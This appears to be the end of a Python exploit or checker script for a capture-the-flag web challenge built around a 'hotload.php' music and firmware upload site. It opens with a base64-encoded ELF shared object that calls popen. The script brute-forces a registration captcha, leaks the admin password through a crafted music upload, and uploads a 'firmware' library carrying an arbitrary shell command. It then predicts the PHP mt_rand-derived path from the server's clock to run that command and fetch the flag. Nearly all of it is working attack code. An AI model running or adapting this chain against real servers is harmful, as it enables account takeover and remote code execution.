AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADARAAAAAAAAAAAAAAAAAADwEAAAAAAAAAEAAAAAAAAAfAAAAAAAAAAMAAAAAAAAAAAQAAAAAAAADQAAAAAAAACsEQAAAAAAABkAAAAAAAAAAD4AAAAAAAAbAAAAAAAAABAAAAAAAAAAGgAAAAAAAAAQPgAAAAAAABwAAAAAAAAACAAAAAAAAAD1/v9vAAAAAGACAAAAAAAABQAAAAAAAACwAwAAAAAAAAYAAAAAAAAAk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2JhbF9kdG9yc19hdXgAY29tcGxldGVkLjczMjUAX19kb19nbG9iYWxfZHRvcnNfYXV4X2ZpbmlfYXJyYXlfZW50cnkAZnJhbWVfZHVtbXkAX19mcmFtZV9kdW1teV9pbml0X2FycmF5X2VudHJ5AGZpcm13YXJlLmMAX19GUkFNRV9FTkRfXwBfZmluaQBfX2Rzb19oYW5kbGUAX0RZTkFNSUMAX19HTlVfRUhfRlJBTUVfSERSAF9fVE1DX0VORF9fAF9HTE9CQUxfT0ZGU0VUX1RBQkxFXwBfaW5pdABfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAZnJlYWRAQEdMSUJDXzIuMi41AGZ1bgBwY2xvc2VAQEdMSUJDXzIuMi41AG1lbXNldEBAR0xJQkNfMi4yLjUAX19nbW9uX3N0YXJ0X18AcG9wZW5AQEdMSUJDXzIuMi41AF92ZXJzaW9uAF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAX19jeGFfZmluYWxpemVAQEdMSUJDXzIuMi41AAAuc3ltdGFiAC5zdHJ0YWIALnNoc3RydGFiAC5ub3RlLmdudS5idWlsZC1pZAAuZ251Lmhhc2gALmR5bnN5bQAuZHluc3RyAC5nbnUudmVyc2lvbgAuZ251LnZlcnNpb25fcgAucmVsYS5keW4ALnJlbGEucGx0AC5pbml0AC5wbHQuZ290AC50ZXh0AC5maW5pAC5yb2RhdGEALmVoX2ZyYW1lX2hkcgAuZWhfZnJhbWUALmluaXRfYXJyYXkALmZpbmlfYXJyYXkALmR5bmFtaWMALmdvdC5wbHQALmRhdGEALmJzcwAuY29tbWVudAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGwAAAAcAAAACAAAAAAAAADgCAAAAAAAAOAIAAAAAAAAkAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAC4AAAD2//9vAgAAAAAAAABgAgAAAAAAAGACAAAAAAAAMAAAAAAAAAADAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAA4AAAACwAAAAIAAAAAAAAAkAIAAAAAAACQAgAAAAAAACABAAAAAAAABAAAAAEAAAAIAAAAAAAAABgAAAAAAAAAQAAAAAMAAAACAAAAAAAAALADAAAAAAAAsAMAAAAAAACSAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAEgAAAD///9vAgAAAAAAAABCBAAAAAAAAEIEAAAAAAAAGAAAAAAAAAADAAAAAAAAAAIAAAAAAAAAAgAAAAAAAABVAAAA/v//bwIAAAAAAAAAYAQAAAAAAABgBAAAAAAAACAAAAAAAAAABAAAAAEAAAAIAAAAAAAAAAAAAAAAAAAAZAAAAAQAAAACAAAAAAAAAIAEAAAAAAAAgAQAAAAAAADwAAAAAAAAAAMAAAAAAAAACAAAAAAAAAAYAAAAAAAAAG4AAAAEAAAAQgAAAAAAAABwBQAAAAAAAHAFAAAAAAAAYAAAAAAAAAADAAAAFQAAAAgAAAAAAAAAGAAAAAAAAAB4AAAAAQAAAAYAAAAAAAAAABAAAAAAAAAAEAAAAAAAABcAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAcwAAAAEAAAAGAAAAAAAAACAQAAAAAAAAIBAAAAAAAABQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAH4AAAABAAAABgAAAAAAAABwEAAAAAAAAHAQAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAACHAAAAAQAAAAYAAAAAAAAAgBAAAAAAAACAEAAAAAAAACsBAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAjQAAAAEAAAAGAAAAAAAAAKwRAAAAAAAArBEAAAAAAAAJAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAJMAAAABAAAAAgAAAAAAAAAAIAAAAAAAAAAgAAAAAAAACQEAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAACbAAAAAQAAAAIAAAAAAAAADCEAAAAAAAAMIQAAAAAAACQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAqQAAAAEAAAACAAAAAAAAADAhAAAAAAAAMCEAAAAAAAB8AAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAALMAAAAOAAAAAwAAAAAAAAAAPgAAAAAAAAAuAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAAC/AAAADwAAAAMAAAAAAAAAED4AAAAAAAAQLgAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAywAAAAYAAAADAAAAAAAAABg+AAAAAAAAGC4AAAAAAADAAQAAAAAAAAQAAAAAAAAACAAAAAAAAAAQAAAAAAAAAIIAAAABAAAAAwAAAAAAAADYPwAAAAAAANgvAAAAAAAAKAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADUAAAAAQAAAAMAAAAAAAAAAEAAAAAAAAAAMAAAAAAAADgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA3QAAAAEAAAADAAAAAAAAADhAAAAAAAAAODAAAAAAAAAQAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAOMAAAAIAAAAAwAAAAAAAABgQAAAAAAAAEgwAAAAAAAAUAEAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAADoAAAAAQAAADAAAAAAAAAAAAAAAAAAAABIMAAAAAAAABwAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAaDAAAAAAAAAoBQAAAAAAABoAAAAsAAAACAAAAAAAAAAYAAAAAAAAAAkAAAADAAAAAAAAAAAAAAAAAAAAAAAAAJA1AAAAAAAAxAEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAARAAAAAwAAAAAAAAAAAAAAAAAAAAAAAABUNwAAAAAAAPEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA')


class php_rand():

    MT_RAND_MT19937 = 0
    MT_RAND_PHP = 1
    php_N = 624
    php_M = 397
    php_left = 0
    php_next = 0
    php_state = [0] * (php_N + 1)
    php_mode = 0

    def __init__(self, seed, mode=0):
        self.php_mt_srand(seed)
        self.php_mode = mode


    def seed(self, seed):
        self.php_mt_srand(seed)


    def rand(self):
        return self.php_mt_rand()


    def hiBit(self, u):
        return u & 0x80000000


    def loBit(self, u):
        return u & 0x00000001


    def loBits(self, u):
        return u & 0x7FFFFFFF


    def mixBits(self, u, v):
        return self.hiBit(u) | self.loBits(v)


    def twist(self, m, u, v):
        return m ^ (self.mixBits(u, v) >> 1) ^ ((-self.loBit(v)) & 0x9908b0df)


    def twist_php(self, m, u, v):
        return m ^ (self.mixBits(u, v) >> 1) ^ ((-self.loBit(u)) & 0x9908b0df)


    def php_mt_initialize(self, seed):
        state = self.php_state
        N = self.php_N
        state[0] = seed & 0xffffffff
        for i in range(1, N):
            state[i] = (1812433253 * (state[i - 1] ^ (state[i - 1] >> 30)) + i) & 0xffffffff
        self.php_state = state


    def php_mt_reload(self):
        self.php_left = 0
        state = self.php_state
        N = self.php_N
        M = self.php_M
        p = 0
        i = N - M
        if self.php_mode == self.MT_RAND_MT19937:
            while i > 0:
                i -= 1
                state[p] = self.twist(state[p + M],state[p + 0],state[p + 1])
                p += 1
            i = M - 1
            while i > 0:
                state[p] = self.twist(state[p+M-N],state[p + 0],state[p + 1])
                p += 1
                i -= 1
            state[p] = self.twist(state[p + M - N],state[p + 0],state[0])
        else:
            while i > 0:
                i -= 1
                state[p] = self.twist_php(state[p + M],state[p + 0],state[p + 1])
                p += 1
            i = M - 1
            while i > 0:
                state[p] = self.twist_php(state[p + M - N],state[p + 0],state[p + 1])
                p += 1
                i -= 1
            state[p] = self.twist_php(state[p + M - N],state[p + 0],state[0])
        self.php_left = N
        self.php_next = 0
        self.php_state = state


    def php_mt_srand(self, seed):
        self.php_mt_initialize(seed)
        self.php_mt_reload()


    def php_mt_rand(self):
        if self.php_left == 0: self.php_mt_reload()
        self.php_left -= 1
        s1 = self.php_state[self.php_next]
        s1 ^= (s1 >> 11)
        s1 ^= (s1 << 7) & 0x9d2c5680
        s1 ^= (s1 << 15) & 0xefc60000
        self.php_next += 1
        return ( s1 ^ (s1 >> 18)) >> 1


# get method
def get(session, url):
    retry = 0
    while True:
        retry += 1
        try:
            if session:
                r = s.get(url, timeout=timeout)
            else:
                r = requests.get(url, timeout=timeout)
        except:
            if retry >= retry_count:
                print('timeout or http 500')
                exit()
            continue
        break
    return r


# post method
def post(session, url, data, files=''):
    retry = 0
    while True:
        retry += 1
        try:
            if session:
                if files=='':
                    r = s.post(url, data=data, timeout=timeout)
                else:
                    r = s.post(url, data=data, files=files, timeout=timeout)
            else:
                if files=='':
                    r = requests.post(url, data=data, timeout=timeout)
                else:
                    r = requests.post(url, data=data, files=files, timeout=timeout)
        except:
            if retry >= retry_count:
                print('timeout or http 500')
                exit()
            continue
        break
    return r


# login with username and password
def login(username, password):
    url = site_url + '/hotload.php?page=login'
    data = {'username': username, 'password': password}
    if logging: print(url)
    if logging: print(data)
    res = post(1, url, data)
    if logging: print(res.text)
    url = site_url + '/hotload.php?page=upload'
    res = get(1, url)
    if 'fileuploaded' not in res.text:
        return False
    return True


# reg with username and password
def reg(username, password):
    url = site_url + '/hotload.php?page=reg'
    if logging: print(url)
    res = get(1, url)
    show_code = ''
    show_calc = ''
    try:
        show_code = res.text.split('show_code">')[1].split('<')[0]
        show_calc = res.text.split('show_calc">')[1].split('<')[0]
        if len(show_calc) != 6:
            print('invalid show_calc length')
            return False
    except:
        return False
    if logging: print("show_code",show_code)
    if logging: print("show_calc",show_calc)
    code = ''
    while True:
        code = rand_str()
        if hashlib.md5(code + show_code).hexdigest()[:6] == show_calc.lower(): break
    data = {'username': username, 'password1': password, 'password2': password, 'code': code}
    if logging: print(data)
    res = post(1, url, data)
    if logging: print(res.text)
    if '"status":1' in res.text:
        return True
    return False


# upload music [diff]
def upload_music():
    url = site_url + '/hotload.php?page=upload'
    data = {'file_id': '0'}
    music = preset_music[:0x6] + '\x00\x00\x03\x00' + preset_music[0x0a:0x53]
    music += '\x00\x00\x03\x00' + '\x00\x00\x03' + 'a' * 0x70 +'\x00'+'a'*(0x300-0x70-1)+ '\x00'
    files = {'file_data': music}
    if logging: print(url)
    if logging: print(data)
    res = post(1, url, data, files)
    if logging: print(res.text)
    if '"status":1' in res.text:
        try:
            return b64decode(json.loads(res.content.strip())['artist'])[:16]
        except:
            return ''
    return ''


# upload firmware [diff]
def upload_firmware(command):
    if len(command) > 0x100: return -1
    url = site_url + '/hotload.php?page=firmware'
    data = {'file_id': '0'}
    command = command.ljust(0x100, '\x00')
    firmware = preset_firmare.replace('a' * 0x100, command)
    files = {'file_data': firmware}
    if logging: print(url)
    if logging: print(data)
    res = post(1, url, data, files)
    if logging: print(res.text)
    if '"status":1' in res.text:
        if 'Date' in res.headers.keys():
            return int(datetime.strptime(res.headers['Date'], "%a, %d %b %Y %X %Z").strftime("%s")) + time_zone_offset
        else:
            return int(time.time())
    return -1


# get firmware version [diff]
def firmware_version(path):
    if len(path)>0x40: return ''
    url = site_url + '/hotload.php?page=firmware'
    data = {'path': path}
    if logging: print(url)
    if logging: print(data)
    res = post(1, url, data)
    if logging: print(res.text)
    try:
        return json.loads(res.content.strip())['info']
    except:
        return ''


# show result
def show_result(vuln1, vuln2, msg):
    result = ''
    if vuln1 == -1:
        result += 'Vuln 1 check: unknown.\n'
    elif vuln1 == 0:
        result += 'Vuln 1 check: fail.\n'
    else:
        result += 'Vuln 1 check: pass.\n'
    if vuln2 == -1:
        result += 'Vuln 2 check: unknown.\n'
    elif vuln2 == 0:
        result += 'Vuln 2 check: fail.\n'
    else:
        result += 'Vuln 2 check: pass.\n'
    result += msg
    print(result)
    exit()


# get flag
def get_flag():
    vuln1 = -1
    vuln2 = -1
    logined = -1
    username = rand_str(8)
    password = rand_str(10)
    res = reg(username, password)
    if not res: show_result(vuln1, vuln2, 'register fail')
    res = login(username, password)
    if not res: show_result(vuln1, vuln2, 'login fail')
    time.sleep(5)
    res = upload_music()
    if res == '':
        vuln1 = 0
        show_result(vuln1, vuln2, 'leak admin password fail')
    admin_password = res
    global s
    s = requests.session()
    res = login('admin', admin_password)
    if not res:
        vuln1 = 0
        show_result(vuln1, vuln2, 'leak wrong admin password')
    vuln1 = 1
    time.sleep(5)
    guess_server_time = upload_firmware(command)
    if guess_server_time == -1:
        show_result(vuln1, vuln2, 'upload fail')
    vuln2 = 0
    succ_keyword = 'version'
    for i in range(5):
        rander = php_rand(guess_server_time - i)
        path = hashlib.md5(str(str(rander.rand()) + internet_ip)).hexdigest()
        try:
            info = firmware_version(path).encode('utf-8')
        except:
            continue
        if succ_keyword in info:
            vuln2 = 1
            break
    url = site_url + flag_path
    if logging: print(url)
    res = get(0, url)
    if len(res.text) <= 0:
        show_result(vuln1, vuln2, info)
    else:
        show_result(vuln1, vuln2, res.text)


if __name__ == '__main__':
    if len(argv) != 4:
        print("wrong params.")
        print("example: python %s %s %s %s" % (argv[0], '127.0.0.1', '80', '$_SERVER["REMOTE_ADDR"]'))
        exit()
    ip = argv[1]
    port = int(argv[2])
    internet_ip = argv[3]
    site_url = 'http://%s:%d' % (ip, port)
    get_flag()
